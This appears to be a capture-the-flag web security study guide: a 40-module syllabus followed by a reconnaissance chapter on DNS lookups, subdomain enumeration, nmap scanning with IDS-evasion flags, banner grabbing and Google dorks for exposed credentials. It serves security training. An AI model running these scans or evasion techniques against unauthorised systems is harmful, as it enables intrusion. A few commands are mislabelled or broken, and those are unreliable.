# Syllabus

## MODULE 1: Reconnaissance & Information Gathering

- Domain enumeration (whois, dig, nslookup)
- DNS reconnaissance
- Port scanning (nmap)
- Web server fingerprinting
- Technology stack identification
- Google dorking
- Subdomain enumeration (sublist3r, amass, ffuf)
- Shodan queries
- OSINT techniques
- Wayback Machine analysis
- Certificate transparency logs

## MODULE 2: Web Server Basics & Architecture

- HTTP/HTTPS fundamentals
- Request-response cycle
- Status codes
- Headers and metadata
- URL structure and parsing
- Web server types (Apache, Nginx, IIS)
- Common configurations and misconfigurations
- Web application firewalls (WAF)

## MODULE 3: Authentication & Session Management

- Authentication mechanisms
- Session tokens and cookies
- JWT (JSON Web Tokens)
- OAuth 2.0
- SAML
- Session fixation
- Session prediction
- Cookie manipulation
- Token leakage
- Multi-factor authentication bypasses
- Default credentials
- Credential stuffing

## MODULE 4: SQL Injection (SQLi)

- SQL basics and queries
- In-band SQLi (Union-based, Error-based)
- Blind SQLi (Boolean-based, Time-based)
- Out-of-band SQLi
- Second-order SQLi
- Bypassing WAF filters
- SQLi in different contexts (WHERE, INSERT, UPDATE, DELETE)
- Database detection and enumeration
- Data extraction techniques
- Stacked queries
- SQLi tools (sqlmap, Burp Suite)

## MODULE 5: Cross-Site Scripting (XSS)

- XSS fundamentals
- Reflected XSS
- Stored XSS
- DOM-based XSS
- Payload encoding and obfuscation
- Context-aware payloads
- Breaking out of tags and attributes
- JavaScript execution contexts
- Content Security Policy (CSP) bypass
- XSS via SVG, images, event handlers
- Cookie stealing and session hijacking via XSS
- XSS tools and payloads

## MODULE 6: Cross-Site Request Forgery (CSRF)

- CSRF mechanics
- Token generation and validation
- SameSite cookie attribute
- CSRF with GET requests
- CSRF with POST requests
- Bypassing CSRF protection
- CSRF token prediction
- Clickjacking integration
- CSRF tools

## MODULE 7: Command Injection & Code Execution

- Command injection basics
- OS command metacharacters
- Filter bypass techniques
- Blind command injection
- Time-based detection
- Reverse shell generation
- Out-of-band exfiltration
- Code injection (eval, exec)
- Template injection
- Server-side template injection (SSTI)
- Expression language injection
- PHP object injection

## MODULE 8: File Upload Vulnerabilities

- File upload mechanisms
- Extension validation bypass
- MIME type spoofing
- Magic number bypass
- Polyglot files
- Path traversal via uploads
- Double extension attacks
- Null byte injection
- Race conditions in upload
- Executable file uploads
- Archive extraction vulnerabilities

## MODULE 9: Path Traversal & Directory Traversal

- Traversal sequences (.., /)
- Encoding bypass (URL, double URL, Unicode)
- Absolute path specifications
- Null byte injection
- Backslash exploitation
- Case sensitivity bypass
- Platform-specific traversal
- Accessing sensitive files (/etc/passwd, /etc/shadow, web.config)
- Log file poisoning

## MODULE 10: Broken Access Control

- Insecure Direct Object References (IDOR)
- Horizontal privilege escalation
- Vertical privilege escalation
- Role-based access control (RBAC) bypass
- Function-level access control bypass
- Missing authorization checks
- Parameter manipulation
- Predictable IDs
- Mass assignment vulnerabilities

## MODULE 11: Security Misconfiguration

- Default credentials and configurations
- Unnecessary services enabled
- Directory listing enabled
- Verbose error messages
- Security headers missing
- Debug mode enabled
- Exposed configuration files
- Backup file exposure
- Unpatched software
- Insecure CORS configuration
- X-Frame-Options bypass

## MODULE 12: Sensitive Data Exposure

- Information disclosure
- Source code exposure
- Credentials in comments
- API key exposure
- Database connection strings
- Private key exposure
- Sensitive data in client-side code
- Insecure transmission
- Unencrypted storage
- Metadata extraction (EXIF, metadata)
- Git repository exposure

## MODULE 13: XML & Deserialization Attacks

- XML External Entity (XXE) injection
- XXE blind attacks
- SSRF via XXE
- Out-of-band data exfiltration
- Java deserialization exploits
- Python pickle exploitation
- .NET deserialization
- PHP object injection
- Gadget chain exploitation

## MODULE 14: Business Logic Flaws

- Price manipulation
- Race conditions
- Order fulfillment bypass
- Inventory manipulation
- Refund exploitation
- Account verification bypass
- Email verification bypass
- OTP bypass
- Rate limit bypass
- Workflow state bypass
- Calculation errors

## MODULE 15: API Exploitation

- RESTful API basics
- API authentication weaknesses
- API rate limiting bypass
- API versioning exploitation
- SOAP injection
- GraphQL injection and enumeration
- Insecure API endpoints
- Mass assignment in APIs
- API key exposure
- API parameter pollution

## MODULE 16: Server-Side Request Forgery (SSRF)

- SSRF mechanics
- Internal network scanning via SSRF
- Cloud metadata exploitation (AWS, GCP, Azure)
- Bypassing SSRF filters
- Localhost bypass techniques
- IP address encoding bypass
- File protocol exploitation
- Gopher protocol exploitation
- Data exfiltration via SSRF

## MODULE 17: Insecure Deserialization & Type Confusion

- Type juggling
- Weak type comparison
- Serialized object manipulation
- Remote code execution via deserialization
- Bypass protection mechanisms

## MODULE 18: Advanced SQL Injection

- Stacked queries and multi-query execution
- SQL operators and functions for data extraction
- Database-specific exploitation (MySQL, PostgreSQL, MSSQL, Oracle)
- SQLi in ORDER BY clause
- SQLi in JOIN clauses
- Second-order SQLi detection
- Polyglot SQLi payloads
- NoSQL injection
- Query chaining

## MODULE 19: Advanced XSS Techniques

- Mutation-based XSS
- Browser quirks and parsing differences
- XSS in different contexts (SVG, MathML, data URLs)
- Bypassing WAF and filters
- Unicode and encoding exploits
- Event handler exploitation
- Script gadgets
- DOM clobbering

## MODULE 20: WebSocket Exploitation

- WebSocket protocol basics
- WebSocket handshake
- Message manipulation
- Cross-Site WebSocket Hijacking (CSWSH)
- WebSocket enumeration
- Real-time data interception

## MODULE 21: HTTP Request Smuggling

- HTTP/1.1 fundamentals
- CL.TE and TE.CL attacks
- TE.TE obscuration
- Cache poisoning via smuggling
- Request splitting
- Desynchronization attacks

## MODULE 22: Click Jacking & UI Redressing

- Clickjacking mechanics
- Frame busting bypass
- UI element manipulation
- Dragging and dropping attacks
- Cursorjacking
- X-Frame-Options bypass

## MODULE 23: Subdomain Takeover

- Dangling DNS records
- CNAME misconfiguration
- Service-specific takeover (GitHub, Heroku, AWS S3)
- Domain expiration exploitation
- Verification bypass

## MODULE 24: Server-Side Template Injection (SSTI)

- Template engine identification
- Expression language injection
- Code execution via templates
- Jinja2, Mako, ERB exploitation
- Freemarker SSTI
- Velocity template injection

## MODULE 25: Prototype Pollution

- JavaScript prototype chain
- Prototype pollution via GET/POST
- Gadget exploitation
- JSON pollution
- Server-side prototype pollution

## MODULE 26: Race Conditions

- Timing windows
- TOCTOU (Time-of-Check-Time-of-Use)
- Concurrent request exploitation
- Account enumeration via race conditions
- Distributed race conditions
- Burp Turbo Intruder usage

## MODULE 27: Cryptographic Failures

- Weak hashing algorithms
- Predictable encryption
- Weak random number generation
- Cryptographic side-channel attacks
- Weak key management
- JWT cryptographic issues

## MODULE 28: SSL/TLS Vulnerabilities

- SSL/TLS downgrade attacks
- Certificate validation bypass
- Heartbleed
- POODLE
- BEAST
- CRIME
- Certificate pinning bypass
- Self-signed certificate exploitation

## MODULE 29: Open Redirect

- Parameter-based redirects
- Whitelist bypass
- Double encoding
- Protocol-based bypasses (javascript:, data:)
- Meta refresh exploitation
- JavaScript-based redirects

## MODULE 30: Kali Linux Tools & Utilities

- Burp Suite (Professional & Community)
- OWASP ZAP
- sqlmap
- Nikto
- Nessus
- OpenVAS
- Metasploit Framework
- hashcat
- John the Ripper
- Hydra
- curl and wget
- netcat
- Wireshark
- tcpdump
- Python scripting for exploitation
- Custom payload generation

## MODULE 31: Encoding & Obfuscation Bypass

- URL encoding
- Double URL encoding
- HTML entity encoding
- Base64 encoding
- Unicode normalization
- Hex encoding
- Octal encoding
- Backslash escaping
- Polymorphic payloads

## MODULE 32: Authentication Bypass Techniques

- Default credential lists
- Brute force attacks
- Dictionary attacks
- Weak password policies
- Authentication logic flaws
- Account enumeration
- Password reset flaws
- Verification email bypass
- Two-factor authentication bypass

## MODULE 33: Privilege Escalation (Web Context)

- Horizontal escalation to admin
- Vertical escalation techniques
- Role manipulation
- Permission inheritance flaws
- Function-level authorization bypass
- Post-authentication exploits

## MODULE 34: Exploit Development & Payload Crafting

- Shellcode generation
- Reverse shell techniques
- Bind shell techniques
- Web shell generation
- Obfuscated payloads
- Polymorphic code
- Evasion techniques
- Msfvenom usage

## MODULE 35: Web Scraping & Automation

- Automated testing frameworks
- Selenium for dynamic content
- Beautiful Soup and requests library
- Scrapy for large-scale scraping
- Automated reconnaissance
- Mass vulnerability detection

## MODULE 36: Logging, Monitoring & Forensics

- Log manipulation and deletion
- Log poisoning
- Clearing browser history and artifacts
- Evidence cleanup
- Identifying detection mechanisms
- Intrusion detection evasion

## MODULE 37: Defense & Detection Avoidance

- WAF fingerprinting and bypass
- IDS/IPS evasion
- Anti-bot detection bypass
- Proxy detection bypass
- VPN and anonymization
- Timing attacks to avoid detection

## MODULE 38: Post-Exploitation & Persistence

- Reverse shell stabilization
- Privilege escalation from shell
- Persistence mechanisms
- Backdoor installation
- Lateral movement
- Data exfiltration techniques

## MODULE 39: CTF-Specific Techniques

- Flag format identification
- Source code analysis
- Decompilation and reverse engineering
- Binary exploitation basics
- Memory analysis
- Steganography basics

## MODULE 40: Real-World Integration

- Bug bounty methodology
- CVSS scoring
- Vulnerability assessment workflow
- Exploit chaining
- Multi-stage attacks
- End-to-end exploitation scenarios

---

# Reconnaissance & Information Gathering

## Domain Enumeration

### WHOIS Queries

WHOIS provides registrant and administrative information about domain ownership, registration dates, and nameserver configurations.

**Basic WHOIS lookup:**

```bash
whois example.com
```

**Key fields in WHOIS output:**

- Registrar information
- Registration and expiration dates
- Registrant contact details (often redacted with privacy services)
- Administrative and technical contacts
- Nameserver listings
- Creation date (useful for infrastructure age assessment)

**Linux-specific consideration:** The `whois` command may require installation on minimal systems:

```bash
apt-get install whois  # Debian/Kali
```

**Windows approach:** Use online WHOIS lookup services or the `whois.exe` utility from various third-party sources, though native Windows lacks built-in WHOIS functionality. Alternatively, leverage PowerShell with third-party modules.

**WHOIS enumeration tactics:**

- Compare multiple registrant records across related domains to identify infrastructure patterns
- Note privacy service usage (suggests potentially sensitive infrastructure)
- Review nameserver hostnames for organizational clues (e.g., `ns1.company-internal.com`)
- Track historical WHOIS data through services like WHOIS history archives (often reveals infrastructure changes)

**Bulk WHOIS queries:**

```bash
for domain in domain1.com domain2.com domain3.com; do whois $domain | grep -E "Registrar:|Created|Expires"; done
```

---

### DIG (Domain Information Groper)

DIG is the primary DNS query tool for reconnaissance, offering granular control over DNS queries and response analysis.

**Basic DNS lookup:**

```bash
dig example.com
```

**Query specific record types:**

```bash
dig example.com A          # IPv4 address records
dig example.com AAAA       # IPv6 address records
dig example.com MX         # Mail exchange records
dig example.com NS         # Nameserver records
dig example.com TXT        # Text records (SPF, DKIM, verification tokens)
dig example.com CNAME      # Canonical name records
dig example.com SOA        # Start of authority records
dig example.com SRV        # Service records
```

**Query-specific nameserver:**

```bash
dig @8.8.8.8 example.com   # Query Google's DNS
dig @ns1.example.com example.com  # Query authoritative nameserver directly
```

**Short output format (minimal noise):**

```bash
dig example.com +short
```

**Full diagnostic output:**

```bash
dig example.com +noall +answer
```

**Zone transfer attempt (often restricted):**

```bash
dig @ns1.example.com example.com AXFR
```

**Reverse DNS lookup:**

```bash
dig -x 192.0.2.1          # Lookup PTR record for IP address
```

**Trace DNS resolution path:**

```bash
dig example.com +trace     # Shows recursive resolution steps through DNS hierarchy
```

**Batch DNS queries:**

```bash
dig example.com example.org example.net +short
```

**DNS response analysis considerations:**

- TTL values indicate caching duration (low TTL suggests frequent changes)
- Multiple A records may indicate load balancing
- TXT records often contain security policies (SPF, DKIM) revealing email infrastructure
- CNAME records can expose backend systems or CDN usage
- NS records identify DNS infrastructure potentially vulnerable to hijacking

---

### NSLOOKUP

NSLOOKUP is simpler than DIG but less flexible; useful for basic queries and Windows compatibility.

**Basic lookup:**

```bash
nslookup example.com
```

**Query specific record type:**

```bash
nslookup -type=MX example.com
nslookup -type=TXT example.com
```

**Query specific nameserver:**

```bash
nslookup example.com 8.8.8.8
```

**Interactive mode:**

```bash
nslookup
> example.com
> server 8.8.8.8
> set type=MX
> example.com
```

**Windows availability:** NSLOOKUP is native to Windows, making it preferable for Windows-based reconnaissance when restricted to standard tools.

**Limitations vs DIG:**

- Less detailed output formatting
- Cannot easily perform zone transfers
- Trace functionality not as comprehensive
- [Inference] NSLOOKUP is deprecated in favor of DIG for advanced use, though it remains functional

---

## DNS Reconnaissance

### Subdomain Enumeration

Subdomain discovery reveals additional attack surface, including development environments, staging servers, and internal-facing systems.

**Brute force enumeration with common wordlists:**

```bash
# Using Kali's built-in wordlists
for subdomain in $(cat /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt); do
  dig +short $subdomain.example.com @8.8.8.8 | grep -v '^$' && echo "$subdomain.example.com"
done
```

**DNSEnum tool:**

```bash
dnsenum example.com
dnsenum -f /path/to/wordlist.txt example.com
dnsenum --dnsserver 8.8.8.8 example.com
```

**Fierce subdomain scanner:**

```bash
fierce --domain example.com
fierce --domain example.com --wordlist /path/to/custom-wordlist.txt
fierce --domain example.com --dns-servers ns1.example.com
```

**Sublist3r (Python-based, aggregates multiple sources):**

```bash
sublist3r -d example.com
sublist3r -d example.com -o results.txt
sublist3r -d example.com -t 10  # 10 threads
```

**Certificate Transparency (CT) log queries:** CT logs provide comprehensive subdomain records since SSL certificates must be publicly logged.

```bash
# Using crt.sh via curl
curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[].name_value' | sort -u

# Or using ctfr tool
ctfr -d example.com -o output.txt
```

**Passive DNS databases:**

```bash
# Using whois/passive DNS API (example with reverse IP lookup)
whois -h whois.abuse.net ip 192.0.2.1

# Using jq to parse JSON responses from API sources
curl -s "https://api.example-passive-dns.com/dns/example.com" | jq '.results[].subdomain'
```

**DNS wildcard detection:**

```bash
# Query non-existent subdomain to detect wildcards
dig nonexistent12345.example.com +short
# If returns IP, wildcard exists
```

**Linux vs Windows:** Linux tools (DNSEnum, Fierce, Sublist3r) are native to Kali. Windows users must install Python versions or use online services. PowerShell alternatives exist but with limited functionality.

---

### DNS Cache Poisoning Assessment

[Inference] Reconnaissance phase includes assessing DNS infrastructure vulnerability to cache poisoning attacks, though actual exploitation is distinct.

**Query DNS server implementation details:**

```bash
dig @ns1.example.com example.com +nocmd +noall +answer
# Observe response patterns and timing to infer server type
```

**Check for DNSSEC implementation:**

```bash
dig example.com +dnssec
# DNSSEC records protect against cache poisoning
```

**Test DNS rebinding vulnerability:**

```bash
# Query the same domain multiple times and observe IP variations
for i in {1..10}; do dig example.com +short; done
# Rapid IP changes suggest rebinding risk
```

---

## Port Scanning

### NMAP Fundamentals

NMAP is the primary port scanning tool in CTF environments. It provides service discovery, version detection, and OS fingerprinting.

**Basic port scan (SYN scan, default):**

```bash
nmap example.com
nmap 192.0.2.1
```

**Scan specific ports:**

```bash
nmap -p 80 example.com           # Single port
nmap -p 80,443,8080 example.com  # Multiple ports
nmap -p 1-1000 example.com       # Port range
nmap -p- example.com             # All 65535 ports (time-intensive)
```

**Scan types:**

```bash
nmap -sS example.com   # SYN scan (stealth, doesn't complete TCP handshake)
nmap -sT example.com   # TCP connect scan (full connection, slower, noisier)
nmap -sU example.com   # UDP scan (slower, less reliable)
nmap -sA example.com   # ACK scan (maps firewall rules, not port state)
nmap -sN example.com   # NULL scan (TCP flags null, RFC violates)
nmap -sF example.com   # FIN scan (FIN flag set)
nmap -sX example.com   # Xmas scan (FIN, PSH, URG flags set)
```

**Service version detection:**

```bash
nmap -sV example.com         # Attempt to identify service versions
nmap -sV --version-intensity 9 example.com  # More aggressive version probing
```

**OS detection:**

```bash
nmap -O example.com          # OS fingerprinting (requires open and closed ports)
nmap -O --osscan-guess example.com  # Aggressive guessing when fingerprint uncertain
```

**Combined reconnaissance scan:**

```bash
nmap -sV -O -sC example.com  # Version detection, OS detection, script scanning
nmap -A example.com          # Aggressive scan (OS, version, script, traceroute)
```

**Script scanning (NSE - Nmap Scripting Engine):**

```bash
nmap --script=default example.com
nmap --script=http-enum example.com        # Enumerate HTTP directories
nmap --script=ssl-enum-ciphers -p 443 example.com  # SSL cipher enumeration
nmap --script=smb-os-discovery example.com # SMB OS detection
nmap --script="http-*" example.com         # Run all HTTP-related scripts
```

**Output formats:**

```bash
nmap -oN scan.txt example.com    # Normal format
nmap -oX scan.xml example.com    # XML format (machine-readable)
nmap -oG scan.gnmap example.com  # Greppable format
nmap -oA scan example.com        # All formats (scan.nmap, scan.xml, scan.gnmap)
```

**Timing templates (speed vs accuracy tradeoff):**

```bash
nmap -T0 example.com   # Paranoid (extremely slow, stealth)
nmap -T1 example.com   # Sneaky
nmap -T2 example.com   # Polite (default consideration for network)
nmap -T3 example.com   # Normal (default)
nmap -T4 example.com   # Aggressive (faster, higher packet loss risk)
nmap -T5 example.com   # Insane (maximum speed, high false negatives)
```

**Firewall/IDS evasion:**

```bash
nmap -f example.com                    # Fragment packets
nmap --mtu 16 example.com              # Set maximum transmission unit
nmap -D decoy1,decoy2,ME example.com   # Use decoy IPs to obscure source
nmap --source-port 53 example.com      # Spoof source port (may bypass filters)
nmap -g 53 example.com                 # Set source port to 53 (DNS)
nmap --proxies socks4://proxy:port example.com  # Route through proxy
```

**Localhost scanning (Linux):**

```bash
nmap localhost
nmap 127.0.0.1
nmap -p- 127.0.0.1      # Scan all ports on local system
```

**Windows scanning considerations:** NMAP on Windows (native or WSL2) functions identically but may require administrative privileges for SYN scans. UDP scans on Windows are particularly resource-intensive.

**Parallel scanning for efficiency:**

```bash
# Scan multiple targets simultaneously
nmap -p 80,443 192.0.2.0/24  # Entire subnet
nmap -iL targets.txt -p 80,443  # Targets from file
```

---

### NMAP Output Interpretation

**Port state categories:**

- `open`: Service actively listening
- `closed`: TCP reset received; port accessible but no service
- `filtered`: No response; likely firewall blocking
- `unfiltered`: Responds to ACK probes but state unknown (rare)
- `open|filtered`: Cannot determine if open or filtered (UDP scans)
- `closed|filtered`: Cannot determine if closed or filtered (rare)

**Service version strings:** NMAP uses heuristics to match response banners against known signatures. Version detection may produce false positives; always verify with manual probing.

---

## Web Server Fingerprinting

### HTTP Header Analysis

HTTP headers reveal server type, technology stack, and potential misconfigurations.

**Retrieve HTTP headers:**

```bash
curl -I http://example.com
curl -v http://example.com  # Verbose output shows full request/response
wget --save-headers -O /dev/null http://example.com 2>&1 | grep -i "^  "
```

**Key informative headers:**

- `Server:` - Web server type and version (e.g., `Apache/2.4.41`, `nginx/1.18.0`)
- `X-Powered-By:` - Application technology (e.g., `PHP/7.4.3`, `ASP.NET`)
- `X-AspNet-Version:` - .NET version
- `X-Runtime:` - Application runtime or framework
- `Set-Cookie:` - Session technology (e.g., `PHPSESSID`, `JSESSIONID` for Java)
- `Allow:` - HTTP methods supported
- `Content-Type:` - Response format (e.g., `application/json`, `text/html`)

**Server header removal detection:**

```bash
# Servers with removed Server header still leak information through other headers
curl -I http://example.com | grep -E "X-Powered-By|X-AspNet-Version|X-Runtime"
```

**Linux vs Windows:** Tools like `curl` and `wget` function identically on both platforms. Windows users in CMD lack these tools natively but can use PowerShell's Invoke-WebRequest or install curl.exe.

---

### Banner Grabbing

Banner grabbing captures service identification strings from network services.

**HTTP banner grabbing:**

```bash
echo "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc example.com 80
telnet example.com 80
GET / HTTP/1.1
Host: example.com
Connection: close
```

**HTTPS banner grabbing:**

```bash
openssl s_client -connect example.com:443 -showcerts 2>/dev/null | head -20
```

**FTP banner grabbing:**

```bash
nc example.com 21
# FTP server responds with version information immediately
```

**SSH banner grabbing:**

```bash
nc example.com 22
# SSH protocol version immediately displayed
```

**SMTP banner grabbing:**

```bash
nc example.com 25
# SMTP server version and capabilities listed
```

**Generic netcat banner grabbing:**

```bash
nc -v example.com [port] < /dev/null
```

**Windows alternatives to netcat:** Windows lacks native netcat; use PowerShell or Telnet:

```powershell
# PowerShell TCP connection
$socket = New-Object System.Net.Sockets.TcpClient
$socket.Connect("example.com", 80)
$stream = $socket.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.WriteLine("GET / HTTP/1.1`r`nHost: example.com`r`nConnection: close")
$writer.Flush()
Get-Content -Path <($stream) -Raw
```

---

### SSL/TLS Fingerprinting

SSL/TLS certificates reveal domain information, expiration, and infrastructure details.

**Certificate examination:**

```bash
openssl s_client -connect example.com:443 -showcerts
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text -noout
```

**Extract certificate information:**

```bash
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -text | grep -E "Subject:|Issuer:|CN=|Not Before|Not After"
```

**Certificate SAN (Subject Alternative Names) enumeration:**

```bash
openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -text | grep -A 1 "Subject Alternative Name"
```

**Cipher suite enumeration:**

```bash
openssl s_client -connect example.com:443 -cipher 'ALL' 2>/dev/null | grep "Cipher"
sslscan example.com:443
nmap --script ssl-enum-ciphers -p 443 example.com
```

**TLS version detection:**

```bash
openssl s_client -connect example.com:443 -tls1
openssl s_client -connect example.com:443 -tls1_2
openssl s_client -connect example.com:443 -tls1_3
```

**Testssl.sh (comprehensive SSL/TLS analysis):**

```bash
testssl.sh example.com:443
testssl.sh --full example.com:443  # Detailed output
testssl.sh --json example.com:443  # Machine-readable output
```

**Certificate transparency log queries (alternative to ctfr):**

```bash
# crt.sh provides JSON API for certificate data
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u
```

**Weak certificate detection indicators:**

- Self-signed certificates (often indicate internal systems or development)
- Expired certificates (suggests misconfiguration or abandoned systems)
- Certificates issued for generic domains (e.g., `*.example.com` on single-purpose subdomain)
- Certificates with long validity periods (poor security practice)
- Certificates signed with deprecated algorithms (SHA-1)

---

### Technology Stack Detection

Technology stack identification guides exploit selection and reveals potential vulnerabilities.

**WAPPALYZER (browser extension or CLI tool):**

```bash
wappalyzer https://example.com
```

**BuiltWith API queries:**

```bash
# Requires API key; free tier available
curl "https://api.builtwith.com/v19/api.json?key=YOUR_KEY&domain=example.com"
```

**Manual fingerprinting via response analysis:**

```bash
# Look for technology clues in HTML source, comments, error pages
curl -s http://example.com | grep -i -E "generator=|x-generator|powered-by|framework"
curl -s http://example.com | grep -i "<!--" | head -5  # HTML comments
```

**Common response patterns by technology:**

- PHP: `.php` file extensions, `PHPSESSID` cookies, `PHP/X.X` in Server header
- ASP.NET: `.aspx` extensions, `VIEWSTATE` hidden field, `ASP.NET_SessionId` cookie
- Node.js: Error stack traces show JavaScript, `Express` in Server header, JSON responses
- Java: `.jsp` extensions, `JSESSIONID` cookie, `X-Powered-By: JSF` header
- Ruby on Rails: `Set-Cookie: _session_id`, `X-Runtime` header, `application.js` in assets
- Python/Django: `csrftoken` cookie, `X-CSRFToken` header, `django` in error messages
- WordPress: `/wp-admin/`, `/wp-includes/`, `wp-content` directory, `X-Powered-By: WordPress`

**CMS detection:**

```bash
# Check for common CMS paths
curl -s http://example.com/wp-admin/ -o /dev/null -w "%{http_code}\n"  # WordPress
curl -s http://example.com/administrator/ -o /dev/null -w "%{http_code}\n"  # Joomla
curl -s http://example.com/administrator.php -o /dev/null -w "%{http_code}\n"  # Drupal
```

**API endpoint detection:**

```bash
# APIs often respond with JSON and use specific paths
curl -I http://example.com/api/
curl -I http://example.com/api/v1/
curl -s http://example.com/api/swagger.json | jq .  # OpenAPI documentation
```

---

## Technology Stack Identification

Technology stack identification determines the programming languages, frameworks, web servers, databases, and libraries running on a target application. This intelligence shapes exploitation strategy by revealing known vulnerabilities and attack surfaces.

**HTTP Headers Analysis**

Extract server information from HTTP response headers:

```bash
curl -I https://target.com
curl -v https://target.com 2>&1 | grep -i "server\|x-powered-by\|x-aspnet"
```

Headers commonly reveal: `Server: Apache/2.4.41`, `X-Powered-By: Express`, `X-AspNet-Version: 4.0.30319`. [Inference] Many administrators disable these headers; absence doesn't confirm absence of technology.

**Whatweb Scanner**

```bash
whatweb https://target.com
whatweb -v https://target.com  # Verbose output
whatweb --log-brief=report.txt https://target.com
```

Identifies CMS platforms (WordPress, Drupal, Joomla), JavaScript frameworks (React, Vue, Angular), server software, and version numbers with confidence ratings.

**Wappalyzer**

Browser extension and CLI tool that fingerprints technologies through JavaScript frameworks, analytics scripts, and HTML patterns:

```bash
# Via CLI (Node.js required)
npm install -g wappalyzer
wappalyzer https://target.com
```

Recognizes frontend frameworks, backend technologies, CDN usage, and monitoring tools.

**Screenshot & DOM Analysis**

```bash
# Capture full-page screenshot
firefox --screenshot target_screenshot.png https://target.com

# Extract JavaScript files and analyze
curl -s https://target.com | grep -oE 'src="[^"]+\.js"' | cut -d'"' -f2

# Identify framework via console/network activity
```

Modern frameworks often expose their identity through bundle names (`main.bundle.js`, `react-dom.production.min.js`) or development mode warnings.

**Source Code Comments & Metadata**

```bash
# Extract comments and metadata
curl -s https://target.com | grep -oE "<!--.*?-->" 
curl -s https://target.com | grep -i "generator\|powered\|built\|framework"

# Check robots.txt and sitemap
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
```

Developer comments often contain framework references, version numbers, or internal paths.

---

## Google Dorking

Google dorking uses advanced search operators to discover information indexed by search engines, revealing exposed files, configuration backups, error pages, and authentication portals.

**Core Operators**

```
site:target.com                    # Results from target domain only
filetype:pdf                       # Specific file types
intitle:"index of"                 # Page titles containing phrase
inurl:admin                        # URLs containing phrase
cache:target.com                   # Google's cached version
link:target.com                    # Pages linking to target
```

**Common CTF-Relevant Dorks**

```
site:target.com filetype:pdf
# Finds PDFs hosted on target domain; often contain configuration details, 
# API documentation, or internal information

site:target.com inurl:backup
# Discovers backup files, database dumps, or configuration exports

site:target.com inurl:admin
# Locates administrative interfaces

intitle:"index of" site:target.com
# Finds directory listings revealing file structure

site:target.com inurl:.git
# Discovers exposed .git repositories

site:target.com filetype:conf OR filetype:config
# Configuration files with hardcoded credentials or API keys

site:target.com "password" OR "api_key" OR "secret"
# Search for sensitive strings in indexed content

site:target.com inurl:api OR inurl:v1 OR inurl:v2
# Discovers API endpoints

cache:target.com
# Views cached version; reveals historical content not currently visible
```

**Command-Line Automation**

```bash
# Using curl with Google (rate-limited; use with caution)
curl "https://www.google.com/search?q=site:target.com+filetype:pdf" \
  -H "User-Agent: Mozilla/5.0"

# Using Python for controlled dorking
python3 -m pip install googlesearch-python
```

```python
from googlesearch import search
for url in search("site:target.com filetype:pdf", num_results=20):
    print(url)
```

[Inference] Google actively rate-limits automated searches. Manual dork queries or specialized tools are more reliable for CTF scenarios.

---

## Subdomain Enumeration

Subdomain enumeration identifies all DNS subdomains under a target domain, exposing hidden services, development environments, and secondary applications that may have weaker security.

**Sublist3r**

```bash
# Basic enumeration
sublist3r -d target.com

# Include all search engines
sublist3r -d target.com -e google,bing,yahoo,baidu

# Brute-force DNS records
sublist3r -d target.com -b

# Write to file
sublist3r -d target.com -o subdomains.txt

# Verify results with port scanning
sublist3r -d target.com -p 80,443,8080,8443
```

Sublist3r queries multiple sources: Google, Yahoo, Bing, Baidu, ASK, DNSdumpster, Netcraft, VirusTotal, ThreatCrowd, SSL certificates (Crtsh), and DNS brute-forcing.

**Amass**

Amass provides more aggressive enumeration with DNS queries, certificate analysis, and web scraping:

```bash
# Passive enumeration (no active DNS queries)
amass enum -passive -d target.com

# Active enumeration with DNS resolution
amass enum -d target.com -active

# Aggressive brute-force
amass enum -d target.com -brute

# Output formats
amass enum -d target.com -o amass_results.txt
amass enum -d target.com -json results.json

# Combine multiple domains
amass enum -d target.com -d subdomain.target.com

# Increase timeout and sources
amass enum -d target.com -timeout 30 -active -sources all
```

Amass uses DNS zone transfers, WHOIS records, certificate transparency logs, search engine results, and brute-force wordlists.

**FFUF (Fuzz Faster U Fool)**

FFUF performs DNS fuzzing to brute-force subdomains using wordlists:

```bash
# Basic subdomain fuzzing
ffuf -u https://FUZZ.target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# Filter by status code (keep 200, reject others)
ffuf -u https://FUZZ.target.com -w wordlist.txt -fc 404

# Filter by response size (remove common 404 sizes)
ffuf -u https://FUZZ.target.com -w wordlist.txt -fs 1234

# Increased threads and timeout
ffuf -u https://FUZZ.target.com -w wordlist.txt -t 100 -timeout 10

# Save results in multiple formats
ffuf -u https://FUZZ.target.com -w wordlist.txt -o results.txt -of csv

# Use custom DNS resolver
ffuf -u https://FUZZ.target.com -w wordlist.txt -x socks5://127.0.0.1:9050

# Wildcard filtering (when target has catch-all DNS)
ffuf -u https://FUZZ.target.com -w wordlist.txt -fr "Did you mean"
```

**Passive Subdomain Discovery**

Query public certificate logs without active DNS queries:

```bash
# Crtsh certificate transparency search
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[].name_value' | sort -u

# DNSdumpster API (passive)
curl -s "https://dnsdumpster.com/" # Requires session/parsing

# VirusTotal (requires API key)
curl -s "https://www.virustotal.com/api/v3/domains/target.com/subdomains" \
  -H "x-apikey: YOUR_API_KEY" | jq
```

**Combining Multiple Tools**

```bash
# Aggregate results from multiple sources
cat sublist3r_results.txt amass_results.txt ffuf_results.txt | sort -u > all_subdomains.txt

# Resolve subdomains to IP addresses
while read subdomain; do 
  echo "$subdomain: $(dig +short $subdomain)"
done < all_subdomains.txt

# Scan for HTTP services on discovered subdomains
masscan -iL all_subdomains.txt -p 80,443,8080,8443 --rate=1000
```

---

## Shodan Queries

Shodan indexes Internet-connected devices and services by scanning for specific banners, certificates, and service responses. Shodan queries discover exposed infrastructure, vulnerable versions, and authentication portals without directly scanning the target.

**Basic Shodan Search Syntax**

```
hostname:target.com              # All results from target domain
org:"Company Name"               # Organization name
net:192.168.1.0/24               # IP range or CIDR
port:22                          # Specific port
product:"Apache"                 # Server product
version:"2.4.41"                 # Specific version
ssl.cert.subject.CN:target.com   # SSL certificate CN
asn:AS12345                      # Autonomous system number
country:US                       # Geographic filtering
before:2023-01-01                # Date filters
after:2023-01-01
```

